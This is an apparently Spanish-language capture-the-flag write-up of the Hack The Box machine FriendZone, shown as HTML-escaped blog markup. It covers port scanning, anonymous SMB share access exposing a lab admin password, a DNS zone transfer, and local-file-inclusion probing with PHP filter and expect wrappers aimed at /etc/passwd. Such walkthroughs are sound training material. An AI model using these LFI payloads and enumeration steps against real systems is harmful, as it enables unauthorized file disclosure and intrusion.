-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,53,80,139,443,445 10.10.10.123 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-12-05 22:51 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.123                              
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                      
-                                                                                                                                 
-PORT    STATE SERVICE     VERSION
-21/tcp  open  ftp         vsftpd 3.0.3    
-22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey:                                                  
-|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                  
-|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                               
-| dns-nsid:                                                     
-|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
-80/tcp  open  http        Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Friend Zone Escape software         
-139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-443/tcp open  ssl/http    Apache httpd 2.4.29
-| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;friendzone.red/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CODERED/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CODERED/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;JO
-| Not valid before: 2018-10-05T21:02:30                                                                                          
-|_Not valid after:  2018-11-04T21:02:30
-| tls-alpn:         
-|_  http/1.1          
-|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;
-|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  
-|_http-title: 404 Not Found                                     
-445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Service Info: Hosts: FRIENDZONE, 127.0.0.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-|_clock-skew: mean: &lt;span class=&quot;nt&quot;&gt;-35m00s&lt;/span&gt;, deviation: 1h09m16s, median: 4m58s
-| smb-os-discovery: 
-|   OS: Windows 6.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 4.7.6-Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   Computer name: friendzone
-|   NetBIOS computer name: FRIENDZONE&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
-|   Domain name: &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
-|   FQDN: friendzone
-|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-12-06T06:56:24+02:00
-| smb2-time: 
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2021-12-06T04:56:24
-|_  start_date: N/A
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;24.44 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos el puerto 21 abierto, así que podríamos tratar de ingresar como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;; sin embargo, tenemos que no se encuentra habilitado.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ftp 10.10.10.123
-Connected to 10.10.10.123.
-220 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.123:k4miyo&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
-331 Please specify the password.
-Password:
-530 Login incorrect.
-Login failed.
-ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;exit
-&lt;/span&gt;221 Goodbye.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos los puertos 80 y 443 asociados a los servicios HTTP y HTTPS, respectivamente; así que antes de visualizar el contenido vía web, vamos a hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; para ver a lo que nos enfrentamos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.123
-http://10.10.10.123 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.123], Title[Friend Zone Escape software]
-❯ whatweb https://10.10.10.123
-https://10.10.10.123 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;404 Not Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.123], Title[404 Not Found]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No vemos nada interesante como un gestor de contenido, así que vamos a visualizar el contenido vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si observamos el puerto 443, tenemos que nos muestra un código de estado 404; por lo que podríamos estar pensando en que se está aplicando &lt;em&gt;virtual hosting&lt;/em&gt;, así que vamos a agregar el dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;friendzone.red&lt;/code&gt; a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y ahora si podemos visualizar el contenido.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Por el momento no vemos algun panel de login o algo que nos pueda llamar la atención, así que vamos a ver el puerto 445, el cual está abierto, así que podríamos tratar de acceder con una null session y ver si tenemos permisos y bajo que recursos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.123
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
-        Disk                                                    Permissions     Comment
-        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Printer Drivers
-        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
-        general                                                 READ ONLY       FriendZone Samba Server Files
-        Development                                             READ, WRITE     FriendZone Samba Server Files
-        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   NO ACCESS       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FriendZone server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-❯ smbclient &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.123 &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt;
-
-        Sharename       Type      Comment
-        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Printer Drivers
-        Files           Disk      FriendZone Samba Server Files /etc/Files
-        general         Disk      FriendZone Samba Server Files
-        Development     Disk      FriendZone Samba Server Files
-        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FriendZone server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos permisos de lectura bajo el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;general&lt;/code&gt; y permisos de lectura y escritura bajo el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Development&lt;/code&gt;. Si le echamos un ojo al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;general&lt;/code&gt; vemos que contiene un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;creds.txt&lt;/code&gt; que ya debe de llamarnos la atención; así que vamos a descargarlo a nuestra máquina de atacante.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.123 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; general
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
-        Disk                                                    Permissions     Comment
-        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        general                                                 READ ONLY
-        .&lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;eneral&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
-        dr--r--r--                0 Wed Jan 16 14:10:51 2019    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-        dr--r--r--                0 Wed Jan 23 15:51:02 2019    ..
-        fr--r--r--               57 Tue Oct  9 18:52:42 2018    creds.txt
-❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.123 &lt;span class=&quot;nt&quot;&gt;--download&lt;/span&gt; general/creds.txt
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: general&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;reds.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;57 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/k4miyo/Documentos/HTB/FriendZone/nmap/10.10.10.123-general_creds.txt
-❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;creds.txt
-───────┬───────────────────────────────────────
-       │ File: creds.txt
-───────┼───────────────────────────────────────
-   1   │ creds &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the admin THING:
-   2   │ 
-   3   │ admin:WORKWORKHhallelujah@#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos las credenciales del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; que por el momento no sabemos en donde podríamos ocuparlas. Ahora, si checamos el contenido del directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Developtment&lt;/code&gt;, vemos que no hay nada; sin embargo, debemos tener presente que tenemos permisos de escritura.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.123 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; Development
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
-        Disk                                                    Permissions     Comment
-        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
-        Development                                             READ, WRITE
-        .&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evelopment&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
-        dr--r--r--                0 Mon Dec  6 20:53:58 2021    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-        dr--r--r--                0 Wed Jan 23 15:51:02 2019    ..
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora, tenemos el puerto 53 abierto, asociado al servicio de DNS; por lo que ya debemos estar pensando en un &lt;strong&gt;&lt;em&gt;Domain Zone Transfer&lt;/em&gt;&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ dig @10.10.10.123 friendzone.red
-                                
-&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; @10.10.10.123 friendzone.red
-&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 server found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                               
-&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd                                         
-&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
-&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 60525
-;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
-;; WARNING: recursion requested but not available                                                                                
-                                
-;; OPT PSEUDOSECTION:                                           
-; EDNS: version: 0, flags:; udp: 4096
-; COOKIE: d8dd4fbbae8004ea53045f1761aed02d6b374f8ae4176943 (good)
-;; QUESTION SECTION:                                            
-;friendzone.red.                        IN      A
-                                
-;; ANSWER SECTION:                                              
-friendzone.red.         604800  IN      A       127.0.0.1
-                                
-;; AUTHORITY SECTION:                                           
-friendzone.red.         604800  IN      NS      localhost.
-
-;; ADDITIONAL SECTION: 
-localhost.              604800  IN      A       127.0.0.1
-localhost.              604800  IN      AAAA    ::1
-                                
-;; Query time: 164 msec
-;; SERVER: 10.10.10.123#53(10.10.10.123)
-;; WHEN: lun dic 06 21:03:31 CST 2021
-;; MSG SIZE  rcvd: 154
-❯ dig @10.10.10.123 friendzone.red axfr
-
-; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; @10.10.10.123 friendzone.red axfr
-; (1 server found)
-;; global options: +cmd
-friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
-friendzone.red.         604800  IN      AAAA    ::1
-friendzone.red.         604800  IN      NS      localhost.
-friendzone.red.         604800  IN      A       127.0.0.1
-administrator1.friendzone.red. 604800 IN A      127.0.0.1
-hr.friendzone.red.      604800  IN      A       127.0.0.1
-uploads.friendzone.red. 604800  IN      A       127.0.0.1
-friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
-;; Query time: 140 msec
-;; SERVER: 10.10.10.123#53(10.10.10.123)
-;; WHEN: lun dic 06 21:03:43 CST 2021
-;; XFR size: 8 records (messages 1, bytes 289)
-
-❯ host -t axfr friendzone.red 10.10.10.123
-Trying &quot;friendzone.red&quot;
-Using domain server:
-Name: 10.10.10.123
-Address: 10.10.10.123#53
-Aliases: 
-
-;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 39055
-;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0
-
-;; QUESTION SECTION:
-;friendzone.red.                        IN      AXFR
-
-;; ANSWER SECTION:
-friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
-friendzone.red.         604800  IN      AAAA    ::1
-friendzone.red.         604800  IN      NS      localhost.
-friendzone.red.         604800  IN      A       127.0.0.1
-administrator1.friendzone.red. 604800 IN A      127.0.0.1
-hr.friendzone.red.      604800  IN      A       127.0.0.1
-uploads.friendzone.red. 604800  IN      A       127.0.0.1
-friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
-
-Received 250 bytes from 10.10.10.123#53 in 140 ms
-
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Encontramos varios subdominios asociados al dominio principal &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;friendzone.red&lt;/code&gt;; así que  vamos a copiarlos y agregarlos a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y posteriormente ver si contenido vía web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tenemos que los subdominios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator1.friendzone.red&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads.friendzone.red&lt;/code&gt; presentan contenido bajo el puerto 443. Si recordamos, tenemos unas credenciales, por lo que podríamos tratar de usarlas en el panel de login.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al ingresar, nos dice que visitemos el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dashboard.php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De lo observamos, nos indica que existen los parámetros &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imagen_id&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename&lt;/code&gt;; como ejemplo debemos colocar lo siguiente:  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;image_id=a.jpg&amp;amp;pagename=timestamp&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A este punto vemos algo curioso, el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename&lt;/code&gt; el cual nos hace pensar que podemos listar recursos de la máquina, es decir, &lt;strong&gt;&lt;em&gt;LFI - Local File Inclusion&lt;/em&gt;&lt;/strong&gt;; por lo que podríamos tratar de ver un recurso interno.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=/etc/passwd&lt;/code&gt; - No vemos nada&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=/etc/hosts&lt;/code&gt; - No vemos nada&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=dashboard.php&lt;/code&gt; - No vemos nada&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=dashboard&lt;/code&gt; - Vemos que se interpreta el código php asociado al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dashboard&lt;/code&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Con esto, podemos pensar que con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename&lt;/code&gt; podemos visualizar archivos php; por lo que podríamos utilizar wrappers para ver archivos del sistema:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=/etc/passwd%00&lt;/code&gt; - No vemos nada.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=expect://ls&lt;/code&gt; - No vemos nada.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=php://filter/resource=/etc/passwd&lt;/code&gt; -  No vemos nada.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=php://filter/convert.base64-encode/resource=/etc/passwd&lt;/code&gt; - No vemos nada.&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=php://filter/convert.base64-encode/resource=timestamp&lt;/code&gt; - Tenemos una cadena en base 64 del archivo php &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timestamp.php&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-friendzone/friendzone-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Copiamos la cadena y la decodificamos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
-
-&amp;lt;?php
-
-
-&lt;span class=&quot;nv&quot;&gt;$time_final&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; + 3600&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Final Access timestamp is &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$time_final&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-
-?&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya vemos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;timestamp.php&lt;/code&gt; y de igual forma, podríamos tratar de ver el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dashboard.php&lt;/code&gt; y para el subdominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uploads.friendzone.red&lt;/code&gt; ver el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload.php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=php://filter/convert.base64-encode/resource=dashboard&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
